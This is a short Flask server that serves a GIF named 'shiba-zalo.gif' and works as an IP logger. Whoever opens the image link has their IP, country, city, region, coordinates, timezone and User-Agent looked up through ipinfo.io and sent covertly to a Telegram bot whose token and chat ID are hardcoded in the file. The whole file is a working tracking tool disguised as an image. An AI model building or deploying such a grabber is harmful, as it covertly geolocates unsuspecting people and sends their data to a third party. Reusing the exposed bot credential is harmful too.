from flask import Flask, request, render_template, send_file
import requests
from datetime import datetime
import pytz
app = Flask(__name__)

def get_time_now():
    tz_Vietnam = pytz.timezone('Asia/Ho_Chi_Minh')
    now_Vietnam = datetime.now(tz_Vietnam)
    return now_Vietnam.strftime('%d-%m-%Y %H:%M:%S')


@app.route('/gif')
def get_ip():
  ip = request.headers.get('X-Forwarded-For', request.remote_addr)
  ip = str(ip).split(',')[0]
  p = requests.get('https://ipinfo.io/' + ip)
  data = p.json()
  try:
    agent = request.headers.get('User-Agent')
  except:
    agent = "null"

  message = 'Time: '+get_time_now()+\
          '\nIP: '+data['ip']+\
          '\nQuốc Gia: '+data['country']+\
          '\nThành Phố: '+data['city']+\
          '\nKhu Vực: '+data['region']+\
          '\nVị trí: '+data['loc']+\
          '\nMúi giờ: '+data['timezone']+\
          '\nAgent: '+agent
  TOKEN, ID = "6552958575:AAHn3IZhviOTw1it4LOrqfIFT93-PRYgSnc", "-4046028577"
  url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + ID + "&text=" + message + "&parse_mode=HTML"
  p = requests.post(url)
  return send_file('shiba-zalo.gif', mimetype='image/gif')


if __name__ == '__main__':
  app.run(host='0.0.0.0', port=80)
